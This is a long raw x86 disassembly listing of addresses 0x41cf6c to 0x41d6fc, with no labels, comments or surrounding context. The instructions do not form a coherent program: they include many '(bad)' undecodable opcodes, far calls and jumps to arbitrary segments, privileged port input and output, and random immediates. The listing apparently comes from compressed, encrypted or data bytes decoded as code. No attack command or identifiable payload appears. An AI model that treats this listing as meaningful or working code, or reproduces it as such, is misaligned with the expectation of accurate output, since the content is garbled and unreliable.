  41cf6c:	out    dx,al
  41cf6d:	add    ch,al
  41cf6f:	test   DWORD PTR [edi+0xa],esi
  41cf72:	cdq    
  41cf73:	cmp    eax,0xa850c5a1
  41cf78:	ins    BYTE PTR es:[edi],dx
  41cf79:	mov    ch,0x2b
  41cf7b:	out    dx,al
  41cf7c:	push   edx
  41cf7d:	cmp    esi,ebp
  41cf7f:	loope  0x41cf2a
  41cf81:	dec    ecx
  41cf82:	test   al,0xba
  41cf84:	in     eax,dx
  41cf85:	pop    edi
  41cf86:	xchg   BYTE PTR [edx-0x14],bl
  41cf89:	cmp    al,0xa2
  41cf8b:	mov    edx,0x7da6c70c
  41cf90:	stos   DWORD PTR es:[edi],eax
  41cf91:	in     al,dx
  41cf92:	test   al,0x91
  41cf94:	dec    edi
  41cf95:	test   al,0x4d
  41cf97:	xor    dl,0x2b
  41cf9a:	test   eax,0xbf6c05aa
  41cf9f:	sahf   
  41cfa0:	push   ss
  41cfa1:	test   al,0xb4
  41cfa3:	pop    eax
  41cfa4:	fistp  QWORD PTR [edx+0x6d]
  41cfa7:	or     BYTE PTR [ebp+ecx*2-0xcc2a764],al
  41cfae:	shr    BYTE PTR [ebp-0x3b3dd130],0xa4
  41cfb5:	mov    ebx,0x9447aa12
  41cfba:	ret    0x3b52
  41cfbd:	cmp    DWORD PTR [esi-0x45f5dac4],ebx
  41cfc3:	iret   
  41cfc4:	sbb    BYTE PTR [edi-0x77c9782c],bh
  41cfca:	aad    0x5e
  41cfcc:	retf   
  41cfcd:	add    eax,0xc0f9bade
  41cfd2:	imul   BYTE PTR [edx]
  41cfd4:	les    esi,FWORD PTR [esi-0x3de638ce]
  41cfda:	pop    edx
  41cfdb:	(bad)  
  41cfdc:	(bad)  
  41cfde:	call   0x7605:0xadc74e01
  41cfe5:	add    cl,BYTE PTR [edi]
  41cfe7:	fild   QWORD PTR [esi+0xffce23a]
  41cfed:	sahf   
  41cfee:	mov    BYTE PTR [ecx+0x4286d211],bh
  41cff4:	xchg   ebp,eax
  41cff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cff6:	ret    
  41cff7:	dec    ebp
  41cff8:	enter  0xbd19,0x7
  41cffc:	and    al,0xda
  41cffe:	jae    0x41cff6
  41d000:	xchg   DWORD PTR [ecx],edx
  41d002:	dec    eax
  41d003:	mov    ebx,0xff109a8d
  41d008:	fldenv [edi-0x6c]
  41d00b:	dec    eax
  41d00c:	sub    ch,BYTE PTR [esi-0x34]
  41d00f:	pushf  
  41d010:	push   esp
  41d011:	sub    ebx,DWORD PTR [edi+edx*1-0x62745501]
  41d018:	or     BYTE PTR [ecx+0x6da231ac],0x67
  41d01f:	dec    edi
  41d020:	adc    DWORD PTR [ebx+0x77a2c4d7],edx
  41d026:	mov    cl,BYTE PTR [esp+0x420783e4]
  41d02d:	dec    BYTE PTR [edi+0x50]
  41d030:	xor    BYTE PTR [ecx],cl
  41d032:	xor    ah,BYTE PTR [ebp+0x7d0cb87a]
  41d038:	fistp  QWORD PTR [esp+ecx*4]
  41d03b:	dec    ebx
  41d03c:	pushf  
  41d03d:	mov    eax,0xd121ef18
  41d042:	rcr    BYTE PTR [edi+0x549a4faf],cl
  41d048:	je     0x41d005
  41d04a:	or     ecx,DWORD PTR [esi]
  41d04c:	or     DWORD PTR [ebp+0x795ddaea],ebx
  41d052:	or     ah,BYTE PTR [esi+0x1e]
  41d055:	pop    eax
  41d056:	dec    edi
  41d057:	mov    ecx,0xcebf96ff
  41d05c:	push   esi
  41d05d:	pop    edx
  41d05e:	dec    esp
  41d05f:	mov    ds:0x4fb4fa19,al
  41d064:	adc    al,0x9c
  41d066:	sbb    ebx,DWORD PTR [ebx+0x44]
  41d069:	test   BYTE PTR [ebp-0x4d7dfa5f],0xd3
  41d070:	jmp    0x41d081
  41d072:	cmp    BYTE PTR [edi],cl
  41d074:	cmp    ah,cl
  41d076:	loope  0x41d0bd
  41d078:	xchg   BYTE PTR [ebx],al
  41d07a:	adc    eax,0xb07e6cae
  41d07f:	aad    0x43
  41d081:	cdq    
  41d082:	sbb    dh,BYTE PTR [ebx-0x3f]
  41d085:	add    DWORD PTR [edi+eax*1],eax
  41d088:	adc    DWORD PTR [esi-0x7ea40b33],ebp
  41d08e:	dec    edx
  41d08f:	test   ebp,ebx
  41d091:	mov    WORD PTR [edx+eiz*4],?
  41d094:	stos   BYTE PTR es:[edi],al
  41d095:	lahf   
  41d096:	(bad)  
  41d097:	call   0x5eb2:0x34ed62fc
  41d09e:	and    BYTE PTR [ecx],cl
  41d0a0:	cmp    BYTE PTR [esi-0xf],dl
  41d0a3:	ret    
  41d0a4:	or     bh,BYTE PTR [ebx+0x1b]
  41d0a7:	jmp    0x41d0d1
  41d0a9:	out    0x21,eax
  41d0ab:	xor    DWORD PTR [ebx-0x19],ecx
  41d0ae:	sar    BYTE PTR [ecx],0xb9
  41d0b1:	into   
  41d0b2:	pusha  
  41d0b3:	pop    ebp
  41d0b4:	icebp  
  41d0b5:	test   DWORD PTR [ebx-0x2b3497ea],eax
  41d0bb:	and    esp,0x13
  41d0be:	in     eax,dx
  41d0bf:	adc    bh,BYTE PTR [ebp+0x1bb8b881]
  41d0c5:	sub    DWORD PTR [ecx-0x66f389ea],ebp
  41d0cb:	loopne 0x41d085
  41d0cd:	cld    
  41d0ce:	loopne 0x41d066
  41d0d0:	cmp    BYTE PTR [edi-0x27],cl
  41d0d3:	mov    DWORD PTR [ecx+0xd],0x4d4a19db
  41d0da:	mov    BYTE PTR [edx+0x68a74e7b],bl
  41d0e0:	out    dx,eax
  41d0e1:	adc    al,0x80
  41d0e3:	in     eax,0x62
  41d0e5:	clc    
  41d0e6:	jne    0x41d079
  41d0e8:	xchg   DWORD PTR [edx+ecx*1+0xf],esp
  41d0ec:	sub    al,0x6c
  41d0ee:	addr16 pop ebp
  41d0f0:	push   edi
  41d0f1:	out    dx,al
  41d0f2:	repz loopne 0x41d0f0
  41d0f5:	xor    eax,0x4d352b62
  41d0fa:	retf   0xac45
  41d0fd:	push   es
  41d0fe:	inc    edi
  41d0ff:	sbb    edi,DWORD PTR [ecx]
  41d101:	mov    WORD PTR [esi-0x73],ds
  41d104:	mov    eax,ds:0x69278025
  41d109:	in     eax,dx
  41d10a:	pop    es
  41d10b:	std    
  41d10c:	ret    
  41d10d:	arpl   cx,bp
  41d10f:	mov    eax,ds:0x34ada354
  41d114:	shl    DWORD PTR [edi+eiz*8+0x5e],cl
  41d118:	sbb    al,0xe7
  41d11a:	pop    ds
  41d11b:	test   eax,0x8fe0250
  41d120:	imul   edx,DWORD PTR [ecx+eax*2-0x49615740],0xffffffda
  41d128:	mov    ds:0xdaa112ae,al
  41d12d:	mov    ah,0xcb
  41d12f:	iret   
  41d130:	rcpps  xmm0,XMMWORD PTR [ebp+0x762f6a64]
  41d137:	xchg   ebp,eax
  41d138:	hlt    
  41d139:	sbb    bl,bh
  41d13b:	ds repnz sub al,0x45
  41d13f:	cmp    bh,BYTE PTR [ecx-0x192b3565]
  41d145:	and    DWORD PTR [eax+0x2450c26c],edi
  41d14b:	push   ebx
  41d14c:	mov    ebx,0x8a62922d
  41d151:	jne    0x41d14e
  41d153:	xchg   edx,eax
  41d154:	adc    DWORD PTR [edx],0xffffffec
  41d157:	fdivr  QWORD PTR [edx-0x34]
  41d15a:	jae    0x41d124
  41d15c:	shr    BYTE PTR [ebx],cl
  41d15e:	mov    al,0x82
  41d160:	inc    edi
  41d161:	mov    edx,0x79e67b83
  41d166:	leave  
  41d167:	cmp    dl,BYTE PTR ds:0x2a8e91
  41d16d:	add    DWORD PTR ds:0x7f5dae60,ebx
  41d173:	pop    es
  41d174:	xchg   ebp,eax
  41d175:	jmp    0x2e51:0x6b65214e
  41d17c:	mov    esi,esi
  41d17e:	cwde   
  41d17f:	cwde   
  41d180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d181:	sub    BYTE PTR [ebx+edi*2],ch
  41d184:	sbb    BYTE PTR [edx],al
  41d186:	es and al,0x29
  41d189:	rol    cl,0xb9
  41d18c:	loopne 0x41d1b1
  41d18e:	and    al,bh
  41d190:	mov    bl,0x3b
  41d192:	dec    ebx
  41d193:	fs clc 
  41d195:	lock sbb DWORD PTR [ebp+0x113a42cc],ebp
  41d19c:	push   ds
  41d19d:	jae    0x41d1cb
  41d19f:	inc    eax
  41d1a0:	push   eax
  41d1a1:	int    0x61
  41d1a3:	sub    al,0x61
  41d1a5:	aam    0x32
  41d1a7:	or     al,0xf
  41d1a9:	sbb    dh,BYTE PTR [esi+0x64]
  41d1ac:	fcomp  QWORD PTR ds:0x4e17e3f2
  41d1b2:	sub    BYTE PTR [eax-0x3a],ch
  41d1b5:	adc    DWORD PTR [eax-0x6c],0xf7dc1166
  41d1bc:	imul   edx,ebx,0x549b1fb0
  41d1c2:	outs   dx,BYTE PTR ds:[esi]
  41d1c3:	mov    ds:0x60c02e12,al
  41d1c8:	(bad)  
  41d1c9:	mov    ch,0x41
  41d1cb:	(bad)  [ebx-0x6fbd06dc]
  41d1d1:	push   ebx
  41d1d2:	push   ecx
  41d1d3:	cmp    al,0x30
  41d1d5:	icebp  
  41d1d6:	dec    ebp
  41d1d7:	les    esp,FWORD PTR [ecx+edx*2]
  41d1da:	inc    edx
  41d1db:	xchg   esp,eax
  41d1dc:	adc    ebp,DWORD PTR [edx]
  41d1de:	dec    ebp
  41d1df:	inc    ecx
  41d1e0:	and    BYTE PTR [bx+si+0x23d4],0x7
  41d1e6:	aas    
  41d1e7:	dec    ebx
  41d1e8:	cmp    eax,0x165494a2
  41d1ed:	pop    eax
  41d1ee:	test   BYTE PTR [eax],bh
  41d1f0:	pop    eax
  41d1f1:	int    0x56
  41d1f3:	pop    es
  41d1f4:	xlat   BYTE PTR ds:[ebx]
  41d1f5:	xor    al,0x9b
  41d1f7:	push   0xb449520b
  41d1fc:	lods   al,BYTE PTR ds:[esi]
  41d1fd:	(bad)  
  41d1fe:	mov    edi,tr6
  41d201:	ins    DWORD PTR es:[edi],dx
  41d202:	mov    dl,ah
  41d204:	mov    esi,0x3f76e753
  41d209:	clc    
  41d20a:	or     BYTE PTR [ebx-0x54],ch
  41d20d:	imul   ebx,DWORD PTR [ecx-0x5755dd24],0x6a
  41d214:	icebp  
  41d215:	outs   dx,BYTE PTR ds:[esi]
  41d216:	adc    ebp,0xfffffff8
  41d219:	jmp    0x41d1cd
  41d21b:	lods   eax,DWORD PTR ds:[esi]
  41d21c:	aad    0xc6
  41d21e:	out    dx,al
  41d21f:	ret    0xc320
  41d222:	cmp    al,0x4e
  41d224:	xchg   DWORD PTR [ebx+0x5804fb4a],edx
  41d22a:	leave  
  41d22b:	out    0x3a,eax
  41d22d:	mov    ds:0x9ae888a0,eax
  41d232:	lahf   
  41d233:	iret   
  41d234:	inc    esp
  41d235:	jns    0x41d204
  41d237:	push   ebx
  41d238:	jns    0x41d2b7
  41d23a:	xor    ecx,ebx
  41d23c:	dec    eax
  41d23d:	mov    DWORD PTR [ecx-0x211b92f3],ebx
  41d243:	iret   
  41d244:	and    ebp,ebp
  41d246:	mov    DWORD PTR [ebx],edx
  41d248:	mov    dl,0x44
  41d24a:	sub    eax,0xd966ad4e
  41d24f:	dec    eax
  41d250:	jmp    0x41d220
  41d252:	xor    bl,cl
  41d254:	pop    edx
  41d255:	div    BYTE PTR [ebp+esi*4-0x75e9d565]
  41d25c:	fidivr WORD PTR [eax]
  41d25e:	pop    esi
  41d25f:	or     al,0xbc
  41d261:	xor    DWORD PTR [ecx],edx
  41d263:	ja     0x41d22d
  41d265:	push   ecx
  41d266:	sti    
  41d267:	adc    BYTE PTR [ebp-0x28748862],bh
  41d26d:	xchg   ebp,eax
  41d26e:	cmc    
  41d26f:	and    edx,esi
  41d271:	neg    ah
  41d273:	jle    0x41d21e
  41d275:	xor    al,0xd6
  41d277:	pop    ss
  41d278:	and    dh,BYTE PTR [ebp+0x2e]
  41d27b:	outs   dx,DWORD PTR ds:[esi]
  41d27c:	cmp    bl,cl
  41d27e:	jecxz  0x41d2c3
  41d280:	aas    
  41d281:	cmp    edi,DWORD PTR [edx]
  41d283:	dec    edi
  41d284:	lds    esp,FWORD PTR [eax-0x71779131]
  41d28a:	pop    ss
  41d28b:	mov    esp,0xe569ea1d
  41d290:	add    bl,ah
  41d292:	arpl   WORD PTR [edx+0x38698161],di
  41d298:	jmp    0x41d222
  41d29a:	jno    0x41d318
  41d29c:	adc    edi,DWORD PTR [ecx]
  41d29e:	int3   
  41d29f:	mov    ch,ah
  41d2a1:	popf   
  41d2a2:	and    eax,0xa66f266d
  41d2a7:	mov    bl,0xda
  41d2a9:	pop    ecx
  41d2aa:	jle    0x41d2c0
  41d2ac:	call   0xc3cbfd1b
  41d2b1:	call   0xbf324b7f
  41d2b6:	in     eax,0xa1
  41d2b8:	push   ebx
  41d2b9:	lods   eax,DWORD PTR ds:[esi]
  41d2ba:	mov    esp,0xe9cda774
  41d2bf:	repz mov bl,0x54
  41d2c2:	inc    esi
  41d2c3:	or     bl,BYTE PTR [ecx+0x3449121]
  41d2c9:	ja     0x41d257
  41d2cb:	push   esp
  41d2cc:	xchg   edi,eax
  41d2cd:	xchg   DWORD PTR [esi-0x5791bd6b],edx
  41d2d3:	jnp    0x41d2d4
  41d2d5:	mov    esi,0x7fb6baef
  41d2da:	mov    ecx,0xa1ccd932
  41d2df:	das    
  41d2e0:	xor    DWORD PTR [eax-0x3b],0xec63576f
  41d2e7:	mov    ch,0xf2
  41d2e9:	mov    edi,0x24d0ed71
  41d2ee:	call   eax
  41d2f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2f1:	xor    DWORD PTR [edx],esi
  41d2f3:	adc    eax,0x8e69929
  41d2f8:	test   BYTE PTR [edx+0x2b385251],ah
  41d2fe:	cwde   
  41d2ff:	jle    0x41d2a2
  41d301:	in     al,0xab
  41d303:	sub    eax,0xf85b0d5e
  41d308:	in     eax,dx
  41d309:	cmc    
  41d30a:	or     eax,0xf41f65f8
  41d30f:	pop    edx
  41d310:	xchg   edx,eax
  41d311:	int3   
  41d312:	jae    0x41d348
  41d314:	cdq    
  41d315:	mov    DWORD PTR [ebx],edi
  41d317:	and    eax,esp
  41d319:	outs   dx,BYTE PTR ds:[esi]
  41d31a:	sub    al,0x6a
  41d31c:	test   BYTE PTR [edx],al
  41d31e:	pop    ss
  41d31f:	aas    
  41d320:	test   DWORD PTR [eax],0xf2728f26
  41d326:	add    DWORD PTR [ebp-0x60],0xdfebf0a9
  41d32d:	lea    esi,ds:0x8007fa20
  41d333:	jne    0x41d384
  41d335:	ins    BYTE PTR es:[edi],dx
  41d336:	out    0xf9,al
  41d338:	outs   dx,DWORD PTR ds:[esi]
  41d339:	iret   
  41d33a:	and    eax,0x2ae4a564
  41d33f:	mov    eax,0x47772c36
  41d344:	int    0xc6
  41d346:	aas    
  41d347:	xlat   BYTE PTR ds:[ebx]
  41d348:	dec    esi
  41d349:	sub    bh,dl
  41d34b:	pop    es
  41d34c:	pop    esp
  41d34d:	iret   
  41d34e:	inc    ecx
  41d34f:	adc    eax,ecx
  41d351:	or     eax,0x35ee3e98
  41d356:	push   edx
  41d357:	or     ch,ah
  41d359:	stc    
  41d35a:	mov    eax,0x2c51e59b
  41d35f:	in     al,0x83
  41d361:	xchg   ecx,eax
  41d362:	jae    0x41d2fb
  41d364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d365:	xchg   ebp,eax
  41d366:	or     ebx,esi
  41d368:	cli    
  41d369:	and    al,0x49
  41d36b:	add    BYTE PTR [ecx+eiz*4-0x3e],dl
  41d36f:	fidiv  DWORD PTR [ebx]
  41d371:	push   edi
  41d372:	test   BYTE PTR [edi],dl
  41d374:	mov    esi,0xcb0d1b2d
  41d379:	and    ebx,esi
  41d37b:	inc    ebp
  41d37c:	dec    esp
  41d37d:	or     cl,BYTE PTR [ecx]
  41d37f:	xor    BYTE PTR [ebx],al
  41d381:	xor    DWORD PTR [esi],edx
  41d383:	nop
  41d384:	scas   eax,DWORD PTR es:[edi]
  41d385:	mov    dh,0x14
  41d387:	fsubr  QWORD PTR [ecx-0xcd460]
  41d38d:	mov    dl,0x3c
  41d38f:	enter  0x51b,0x65
  41d393:	test   al,0xbc
  41d396:	(bad)  
  41d397:	ja     0x41d37b
  41d399:	stos   BYTE PTR es:[edi],al
  41d39a:	test   ah,ch
  41d39c:	pop    edi
  41d39d:	inc    ebp
  41d39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d39f:	rol    DWORD PTR [ebx+edi*8-0x550bddf3],0xdf
  41d3a7:	fdivr  DWORD PTR [ecx]
  41d3a9:	add    ebp,esi
  41d3ab:	pop    ebx
  41d3ac:	xor    al,0x77
  41d3ae:	popf   
  41d3af:	cmp    eax,0x8440543a
  41d3b4:	inc    eax
  41d3b5:	inc    eax
  41d3b6:	fnsave [edx+0x6868478]
  41d3bc:	jmp    0xc518b1cd
  41d3c1:	lods   al,BYTE PTR ds:[esi]
  41d3c2:	out    dx,eax
  41d3c3:	(bad)  
  41d3c4:	aas    
  41d3c5:	push   ds
  41d3c6:	push   edx
  41d3c7:	push   ds
  41d3c8:	ficomp DWORD PTR [esi+ebp*2+0x39395bd7]
  41d3cf:	hlt    
  41d3d0:	inc    edx
  41d3d1:	pop    ss
  41d3d2:	add    BYTE PTR [ebp+0x5c550d64],bl
  41d3d8:	addr16 add eax,0x6c957561
  41d3de:	arpl   WORD PTR [ebx-0x4fd18464],cx
  41d3e4:	sbb    edx,DWORD PTR [ebp+edx*2+0x5a]
  41d3e8:	seto   BYTE PTR [ebp+eax*2+0x3a04a932]
  41d3f0:	xchg   esp,eax
  41d3f1:	sub    al,0xe4
  41d3f3:	fdivr  DWORD PTR [ebx+0x6aca2446]
  41d3f9:	pop    esi
  41d3fa:	inc    esi
  41d3fb:	and    dh,cl
  41d3fd:	in     eax,0x95
  41d3ff:	cli    
  41d400:	mov    cl,0xbb
  41d402:	(bad)  
  41d403:	and    BYTE PTR [edx+ecx*2+0x7a],bh
  41d407:	retw   
  41d409:	inc    ebp
  41d40a:	xchg   ebp,eax
  41d40b:	mov    esi,0xe3c51545
  41d410:	push   cs
  41d411:	fcomp  QWORD PTR ss:[ebx+0x10]
  41d415:	xchg   ebp,eax
  41d416:	push   0x72
  41d418:	(bad)  
  41d419:	jl     0x41d44e
  41d41b:	in     eax,0x35
  41d41d:	ins    DWORD PTR es:[edi],dx
  41d41e:	retf   
  41d41f:	pushf  
  41d420:	sbb    BYTE PTR [ebx],dh
  41d422:	mov    al,ds:0xd45f09b4
  41d427:	out    0xc6,eax
  41d429:	loopne 0x41d3ea
  41d42b:	mov    edx,DWORD PTR [edx+0x17]
  41d42e:	sbb    BYTE PTR [edx],0xd0
  41d431:	dec    esp
  41d432:	jl     0x41d467
  41d434:	push   edi
  41d435:	test   BYTE PTR [edi],dh
  41d437:	fcmovu st,st(5)
  41d439:	pop    ds
  41d43a:	mov    esi,edx
  41d43c:	mov    eax,ds:0x3d588fec
  41d441:	in     al,0x6c
  41d443:	pop    ebp
  41d444:	fwait
  41d445:	inc    edi
  41d446:	cmp    edx,eax
  41d448:	lock std 
  41d44a:	mov    ecx,0x92154f49
  41d44f:	arpl   WORD PTR ds:0x8cb58d83,ax
  41d455:	jmp    0x41d472
  41d457:	add    edi,esp
  41d459:	or     al,0xcc
  41d45b:	fisub  DWORD PTR [ecx+0xf]
  41d45e:	jl     0x41d490
  41d460:	jge    0x41d409
  41d462:	cmp    ebp,DWORD PTR [edi-0x58]
  41d465:	mov    DWORD PTR [edi+0x28],edx
  41d468:	xchg   edx,eax
  41d469:	sub    eax,0x1f42b792
  41d46e:	pop    ecx
  41d46f:	mov    dh,BYTE PTR [edi]
  41d471:	movntq QWORD PTR [edx],mm2
  41d474:	add    DWORD PTR [ecx],0x29
  41d477:	mov    eax,0x1684d0e6
  41d47c:	push   es
  41d47d:	mov    fs,WORD PTR [ecx]
  41d47f:	inc    ecx
  41d480:	out    dx,al
  41d481:	or     dl,BYTE PTR [esi-0x5f602cae]
  41d487:	mov    bh,0x17
  41d489:	ins    DWORD PTR es:[edi],dx
  41d48a:	leave  
  41d48b:	pop    ds
  41d48c:	pop    esi
  41d48d:	je     0x41d4cf
  41d48f:	iret   
  41d490:	in     eax,dx
  41d491:	cmp    DWORD PTR [ebx-0x477b11c0],edx
  41d497:	or     eax,0xfe2a2357
  41d49c:	sbb    eax,0x31d180
  41d4a1:	dec    edx
  41d4a2:	or     DWORD PTR [ecx+0x57ef0ab4],ebp
  41d4a8:	(bad)  
  41d4a9:	mov    edi,0xb38c6322
  41d4ae:	punpcklbw mm3,DWORD PTR [edi+0x77]
  41d4b2:	test   DWORD PTR [ebp+eiz*1+0x6a1bfc0b],edi
  41d4b9:	cs popa 
  41d4bb:	call   0xefb06e11
  41d4c0:	cmc    
  41d4c1:	sub    edx,0x63
  41d4c4:	and    al,0x1a
  41d4c6:	dec    ecx
  41d4c7:	jb     0x41d460
  41d4c9:	pop    esi
  41d4ca:	mov    al,ds:0x6abfeb2f
  41d4cf:	out    0x93,eax
  41d4d1:	outs   dx,BYTE PTR ds:[esi]
  41d4d2:	mov    BYTE PTR [ebp-0x8e63a81],bh
  41d4d8:	dec    eax
  41d4d9:	inc    ebx
  41d4da:	(bad)  
  41d4dc:	mov    eax,ds:0x30b70af
  41d4e1:	inc    ebp
  41d4e2:	scas   eax,DWORD PTR es:[edi]
  41d4e3:	daa    
  41d4e4:	jg     0x41d4e5
  41d4e6:	scas   al,BYTE PTR es:[edi]
  41d4e7:	cmp    BYTE PTR [esi],ch
  41d4e9:	mov    DWORD PTR [edx+0x4d3bddbe],ebp
  41d4ef:	pop    ecx
  41d4f0:	lahf   
  41d4f1:	mov    al,0x7f
  41d4f3:	out    dx,al
  41d4f4:	lods   al,BYTE PTR ds:[esi]
  41d4f5:	jge    0x41d560
  41d4f7:	repz pop edx
  41d4f9:	push   0xffffffd6
  41d4fb:	mov    eax,ds:0xfd0c1fe5
  41d500:	gs stos DWORD PTR es:[edi],eax
  41d502:	(bad)  
  41d503:	fimul  DWORD PTR [edi]
  41d505:	xor    ebx,ecx
  41d507:	push   edx
  41d508:	shl    BYTE PTR [eax],1
  41d50a:	ss inc eax
  41d50c:	shl    DWORD PTR [edi+0x5597774a],0x99
  41d513:	iret   
  41d514:	std    
  41d515:	shr    DWORD PTR [eax+0x3b],0x2e
  41d519:	and    al,0xa3
  41d51b:	inc    eax
  41d51c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d51d:	ja     0x41d549
  41d51f:	bound  ecx,QWORD PTR [ecx]
  41d521:	loopne 0x41d4a9
  41d523:	mov    bl,0x11
  41d525:	mov    cl,bl
  41d527:	jns    0x41d4f8
  41d529:	out    0x3f,al
  41d52b:	sub    ch,BYTE PTR [edi-0x2b]
  41d52e:	mov    ebx,0x5767aa12
  41d533:	push   ebp
  41d534:	bound  eax,QWORD PTR [edi-0x1a]
  41d537:	aad    0x77
  41d539:	loopne 0x41d586
  41d53b:	sub    al,0x85
  41d53d:	and    ah,bh
  41d53f:	mov    eax,0x8ac90ba4
  41d544:	outs   dx,BYTE PTR ds:[esi]
  41d545:	push   0x199a52e9
  41d54a:	jle    0x41d5a0
  41d54c:	inc    esi
  41d54d:	or     BYTE PTR [esi+esi*4],dl
  41d550:	jmp    0x9e6d:0x2f4fa691
  41d557:	test   dh,0x8d
  41d55a:	mov    dh,0xd6
  41d55c:	xor    esp,DWORD PTR [edx+0x2c]
  41d55f:	rol    BYTE PTR [ecx],cl
  41d561:	mov    edi,0x791ff934
  41d566:	call   0xfd60:0xfe0e32fa
  41d56d:	aad    0xc8
  41d56f:	(bad)  
  41d570:	and    al,0xc2
  41d572:	mov    eax,0x3da3eb5b
  41d577:	fcom   DWORD PTR [esi-0x6e7bfb6e]
  41d57d:	mov    al,ds:0x96619466
  41d582:	fild   WORD PTR [edx+0x6]
  41d585:	retf   0x1459
  41d588:	mov    ch,0xa3
  41d58a:	xchg   ecx,ecx
  41d58c:	xchg   edx,eax
  41d58d:	push   ebx
  41d58e:	adc    ecx,ecx
  41d590:	sub    BYTE PTR [esi],bh
  41d592:	dec    edx
  41d593:	stc    
  41d594:	mov    ds,WORD PTR [edx-0x2147e2f3]
  41d59a:	js     0x41d571
  41d59c:	loopne 0x41d5d9
  41d59e:	dec    eax
  41d59f:	push   ecx
  41d5a0:	call   DWORD PTR ds:0x12757dcb
  41d5a6:	fistp  DWORD PTR [esi+0x28bbfe72]
  41d5ac:	adc    eax,0x768a2800
  41d5b1:	sub    esp,DWORD PTR [esi-0x7a]
  41d5b4:	cmc    
  41d5b5:	add    al,0xc5
  41d5b7:	loop   0x41d55e
  41d5b9:	ds int 0xbe
  41d5bc:	rol    BYTE PTR [eax-0x15086a4b],cl
  41d5c2:	jo     0x41d56e
  41d5c4:	sbb    BYTE PTR [ebx+eax*1+0x760af266],bh
  41d5cb:	and    eax,0x82d4eb62
  41d5d0:	out    0xb8,eax
  41d5d2:	add    DWORD PTR [ebx-0xd],edi
  41d5d5:	xor    al,0x33
  41d5d7:	sub    eax,0xe601a9e6
  41d5dc:	dec    edx
  41d5dd:	xor    al,cl
  41d5df:	test   eax,edx
  41d5e1:	jnp    0x41d61b
  41d5e3:	in     eax,0xbe
  41d5e5:	popa   
  41d5e6:	xor    al,0xea
  41d5e8:	adc    al,0xb8
  41d5ea:	fadd   QWORD PTR [eax]
  41d5ec:	pop    ds
  41d5ed:	push   cs
  41d5ee:	loop   0x41d634
  41d5f0:	sub    DWORD PTR [ecx+0x65d987d3],ecx
  41d5f6:	in     al,dx
  41d5f7:	adc    eax,0xadb11cc3
  41d5fc:	jne    0x41d653
  41d5fe:	(bad)  
  41d600:	ja     0x41d5a8
  41d602:	mov    es,WORD PTR [esi-0x41e4a623]
  41d608:	lods   eax,DWORD PTR ds:[esi]
  41d609:	and    ch,dl
  41d60b:	mov    ds,WORD PTR [edi+edx*2-0x5e]
  41d60f:	clc    
  41d610:	xchg   edx,eax
  41d611:	cmp    al,0xb7
  41d613:	add    BYTE PTR [ebx-0x16],dl
  41d616:	fcmovnb st,st(7)
  41d618:	pop    edx
  41d619:	push   edi
  41d61a:	stos   DWORD PTR es:[edi],eax
  41d61b:	and    DWORD PTR [eax+ebp*4-0x46eed3f8],0xa8657be8
  41d626:	stos   BYTE PTR es:[edi],al
  41d627:	out    0x56,al
  41d629:	fisub  WORD PTR [esi]
  41d62b:	mov    dl,0x8c
  41d62d:	ss cli 
  41d62f:	mov    ch,0x6a
  41d631:	aad    0x15
  41d633:	cmp    ah,BYTE PTR [ebp-0x1]
  41d636:	cmp    dh,dl
  41d638:	retf   0x6c09
  41d63b:	jp     0x41d616
  41d63d:	in     al,dx
  41d63e:	xor    DWORD PTR ds:0x2fb5fde5,0xd4b8aca2
  41d648:	pop    ecx
  41d649:	xor    cl,BYTE PTR [edi+0x14]
  41d64c:	call   0x46ef:0xd0a2d257
  41d653:	inc    edi
  41d654:	fxam   
  41d656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d657:	scas   al,BYTE PTR es:[edi]
  41d658:	fisubr DWORD PTR [ebp+0x46fe91b]
  41d65e:	jne    0x41d5f0
  41d660:	iret   
  41d661:	sub    ecx,esi
  41d663:	fs pop ebx
  41d665:	lahf   
  41d666:	in     eax,dx
  41d667:	aam    0x1c
  41d669:	or     al,ch
  41d66b:	sti    
  41d66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d66d:	popa   
  41d66e:	mov    edi,0xbe42ea4
  41d673:	mov    bh,0xe9
  41d675:	and    al,0x14
  41d677:	adc    eax,0xadea1680
  41d67c:	pop    ds
  41d67d:	call   0x4ef1:0x8f96c30a
  41d684:	imul   edx,DWORD PTR [ebx-0x11],0x44
  41d688:	test   eax,0xa598cb8c
  41d68d:	xchg   esp,eax
  41d68e:	sbb    DWORD PTR [edi-0x1],edx
  41d691:	aas    
  41d692:	xlat   BYTE PTR ds:[ebx]
  41d693:	or     ch,BYTE PTR [eax+eiz*8-0x4f8492e3]
  41d69a:	jl     0x41d689
  41d69c:	out    dx,al
  41d69d:	lock cmc 
  41d69f:	js     0x41d6bf
  41d6a1:	mov    cl,0x13
  41d6a3:	cmp    ebx,DWORD PTR [edx]
  41d6a5:	(bad)  
  41d6a6:	pop    ecx
  41d6a7:	(bad)  
  41d6a8:	jbe    0x41d68d
  41d6aa:	mov    esp,0xa064ba2
  41d6af:	adc    dh,BYTE PTR [ebx+0x12b54324]
  41d6b5:	inc    ebp
  41d6b6:	fdiv   st(0),st
  41d6b8:	or     esp,DWORD PTR [eax+0x3aa8b8f4]
  41d6be:	lods   eax,DWORD PTR ds:[esi]
  41d6bf:	cmp    ecx,ecx
  41d6c1:	mov    ebx,0x791adee5
  41d6c6:	xchg   esp,eax
  41d6c7:	jne    0x41d6bb
  41d6c9:	mov    ah,0xb8
  41d6cb:	int3   
  41d6cc:	fbld   TBYTE PTR [edx+0x26eb0b46]
  41d6d2:	daa    
  41d6d3:	imul   ebx,DWORD PTR es:[edx],0xfc9a0b97
  41d6da:	int    0xe
  41d6dc:	add    eax,0x64ebf26
  41d6e1:	stos   BYTE PTR es:[edi],al
  41d6e2:	jge    0x41d70b
  41d6e4:	rol    BYTE PTR [ebx-0x7c10bf90],cl
  41d6ea:	gs cwde 
  41d6ec:	repnz push cs
  41d6ee:	inc    edi
  41d6ef:	pop    ebx
  41d6f0:	mov    ebx,0x936c232a
  41d6f5:	repz fmul QWORD PTR [edx-0x71c6a221]
  41d6fc:	repz out 0x9d,eax
